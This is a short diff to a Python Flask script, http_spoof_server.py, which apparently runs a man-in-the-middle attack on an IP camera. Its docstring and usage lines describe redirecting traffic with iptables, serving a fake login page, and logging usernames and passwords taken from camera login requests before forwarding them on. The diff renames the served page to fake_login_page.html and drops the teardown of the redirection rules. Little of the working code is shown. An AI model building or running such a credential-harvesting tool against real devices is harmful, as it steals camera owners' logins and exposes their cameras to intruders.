@@ -5,12 +5,13 @@
 # 1. Open terminal
 # 2. Navigate to the directory containing this script
 # 3. Type in the command: sudo python3 http_spoof_server.py --camera 192.168.0.5 --port 88 --iface <your-interface>
+
 """
 http_spoof_server.py
 
 A Flask app that:
-- Sets up and tears down iptables redirection rules automatically.
-- Serves your index.html (and any static/ assets) for all browser GETs.
+- Sets up iptables redirection automatically.
+- Serves the fake_login_page.html (and the static/ assets) for all browser GETs.
 - Intercepts GETs to /cgi-bin/CGIProxy.fcgi?cmd=login&usr=…&pwd=…
   → logs the credentials (from URL params OR cookies), forwards to real camera, and returns camera’s response.
 Usage: sudo python3 http_spoof_server.py --camera CAMERA_IP --port PORT --iface IFACE
@@ -69,7 +70,7 @@ def setup_forwarding(enable=True):
 
 @app.route('/', methods=['GET'])
 @app.route('/<path:filepath>', methods=['GET'])
-def serve_index_or_static(filepath=""):
+def serve_fake_login_page_or_static(filepath=""):
     """
     For any GET path:
     - If it begins with "cgi-bin/CGIProxy.fcgi", divert to proxy_cgi().
